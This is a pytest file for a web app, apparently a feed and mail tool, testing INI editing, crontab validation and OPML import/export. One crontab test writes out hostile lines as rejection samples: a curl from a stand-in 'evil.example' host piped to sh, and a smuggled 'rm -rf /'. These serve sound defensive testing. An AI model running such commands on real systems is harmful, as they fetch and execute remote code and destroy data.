INI = """# Kommentar bleibt
[IMAP]
imapHost = alt.example.com
imapUser = alt

[SMTP]
port = 587
"""


def test_set_ini_values_replaces_and_keeps_comments(app_module):
    result = app_module.set_ini_values(INI, {"IMAP": {"imaphost": "neu.example.com"}})
    assert "# Kommentar bleibt" in result
    # key spelling from the file is kept
    assert "imapHost = neu.example.com" in result
    assert "imapUser = alt" in result


def test_set_ini_values_appends_missing_key_to_its_section(app_module):
    result = app_module.set_ini_values(INI, {"IMAP": {"imapPasscode": "geheim"}})
    lines = result.splitlines()
    assert lines.index("imapPasscode = geheim") < lines.index("[SMTP]")


def test_set_ini_values_adds_missing_section(app_module):
    result = app_module.set_ini_values(INI, {"options": {"filterfolder": "Papierkorb"}})
    assert result.endswith("[options]\nfilterfolder = Papierkorb\n")


def test_set_ini_values_result_is_valid_ini(app_module):
    import configparser
    result = app_module.set_ini_values(INI, {"IMAP": {"imapHost": "x"}, "Neu": {"a": "1"}})
    config = configparser.ConfigParser()
    config.read_string(result)
    assert config["IMAP"]["imapHost"] == "x"
    assert config["Neu"]["a"] == "1"


def test_default_crontab_is_accepted(app_module):
    with open("/etc/cron.d/myjobs") as f:
        assert app_module.invalid_crontab_lines(f.read()) == []


def test_crontab_rejects_other_commands(app_module):
    bad = "* * * * * root curl https://evil.example | sh\n"
    assert app_module.invalid_crontab_lines(bad) == [bad.strip()]
    assert app_module.invalid_crontab_lines("* * * * * root python3 /app/nsm.py; rm -rf /\n")


def test_crontab_scripts_must_run_as_nsm(app_module):
    assert app_module.invalid_crontab_lines("58 * * * * root /opt/venv/bin/python3 /app/nsm.py\n")
    assert app_module.invalid_crontab_lines("58 * * * * nsm /opt/venv/bin/python3 /app/nsm.py\n") == []
    assert app_module.invalid_crontab_lines("15 * * * * nsm pkill -f /opt/firefox/\n")


def test_opml_import_and_export_keep_percent_in_urls(app_module, monkeypatch, tmp_path):
    import io
    feeds = tmp_path / "feeds.cfg"
    feeds.write_text("", encoding="utf-8")
    monkeypatch.setattr(app_module.common, "FEEDS_PATH", str(feeds))
    monkeypatch.setattr(app_module.common, "DATA_DIR", str(tmp_path))
    monkeypatch.setattr(app_module, "create_missing_feed_folders", lambda: ([], None))
    opml = b'<opml version="1.0"><body><outline text="Suche" xmlUrl="https://x.example/rss?q=a%20b"/></body></opml>'
    client = app_module.app.test_client()
    headers = {"Authorization": "Basic YWRtaW46dGVzdA==", "X-CSRF-Token": app_module.CSRF_TOKEN}
    response = client.post("/import-opml", headers=headers, data={"file": (io.BytesIO(opml), "feeds.opml")})
    assert response.status_code == 200
    assert "url = https://x.example/rss?q=a%20b" in feeds.read_text(encoding="utf-8")
    response = client.get("/export-opml", headers=headers)
    assert response.status_code == 200 and b"q=a%20b" in response.data
